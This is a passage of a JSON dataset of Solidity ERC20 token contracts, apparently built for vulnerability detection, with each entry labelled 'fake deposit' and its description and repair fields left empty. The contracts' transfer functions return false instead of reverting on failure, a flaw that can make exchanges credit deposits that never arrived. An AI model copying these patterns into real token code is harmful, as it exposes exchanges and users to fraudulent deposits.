approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: Unlicense\r\n\r\n// ----------------------------------------------------------------------------\r\n// 'SnowShibaInu' token contract\r\n//\r\n// Symbol      : SNOWINU \u2744\ufe0f\r\n// Name        : Snow Shiba Inu\r\n// Total supply: 100000000000000\r\n// Decimals    : 18\r\n//\r\n// TOTAL SUPPLY 1,000,000,000,000,000\r\n// 50% Burned\r\n// ----------------------------------------------------------------------------\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract SnowShibaInu is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Snow Shiba Inu\";\r\n    string public constant symbol = \"SNOWINU \u2744\ufe0f\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract HotaruInu is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Hotaru Inu\";\r\n    string public constant symbol = \"HOTARU\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract CryptoCasinoToken is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Crypto Casino Token\";\r\n    string public constant symbol = \"CRYCAS\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        throw;\r\n    }\r\n\r\n    string public name;\r\n    uint8 public decimals;\r\n    string public symbol;\r\n    string public version = 'H1.0';\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 10000000;\r\n        totalSupply = 10000000;\r\n        name = \"Anonymous Coin\";\r\n        decimals = 0;\r\n        symbol = \"ANON\";\r\n    }\r\n\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\ncontract SHIBA_INU_v2 is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000*10**uint256(decimals);\r\n    string public constant name = \"SHIBA INU v2\";\r\n    string public constant symbol = \"SHIBB\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract TCP is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 250000000*10**uint256(decimals);\r\n    string public constant name = \"Crypto Prophecies\";\r\n    string public constant symbol = \"TCP\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n    \r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n\r\n   \r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        throw;\r\n    }\r\n\r\n    string public name;\r\n    uint8 public decimals;\r\n    string public symbol;\r\n    string public version = 'H1.0';\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 1000000000;\r\n        totalSupply = 1000000000;\r\n        name = \"pig.finance\";\r\n        decimals = 0;\r\n        symbol = \"PIG\";\r\n    }\r\n\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Biomutant_In_Game_Token is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Biomutant In-Game Token\";\r\n    string public constant symbol = \"$BIOM\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/**\r\n *Submitted for verification at Etherscan.io on 2021-06-27\r\n*/\r\n\r\n/**\r\n *voltnft.com\r\n*/\r\n\r\n/**\r\n *Digital marketplace for crypto collectibles\r\nand non-fungible tokens (NFTs).\r\n*/\r\n\r\n/**\r\n *\r\n*/\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract VoltNFT is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 20000000*10**uint256(decimals);\r\n\r\n    string public constant name = \"VoltNFT\";\r\n    string public constant symbol = \"VOLTY\";\r\n\r\n    address payable teamAddress;\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n\r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n\r\n    function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n       if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        throw;\r\n    }\r\n\r\n    \r\n    string public name;                   \r\n    uint8 public decimals;                \r\n    string public symbol;                 \r\n    string public version = 'H1.0';       \r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 666666666000000000000000000;              \r\n        totalSupply = 1000000000000000000000000000;                       \r\n        name = \"SISURI - THE Moral AI\";                                 \r\n        decimals = 18;                          \r\n        symbol = \"MORAL\";                              \r\n    }\r\n\r\n   \r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n    \r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: Unlicensed\r\n\r\n/**\r\n    Tokenplace \r\n    Tokenplace, a next-generation trading platform for beginners and seasoned trading professionals alike.\r\n    250 million total supply\r\n*/\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Tokenplace is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 250000000*10**uint256(decimals);\r\n    string public constant name = \"Tokenplace\";\r\n    string public constant symbol = \"TOK\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
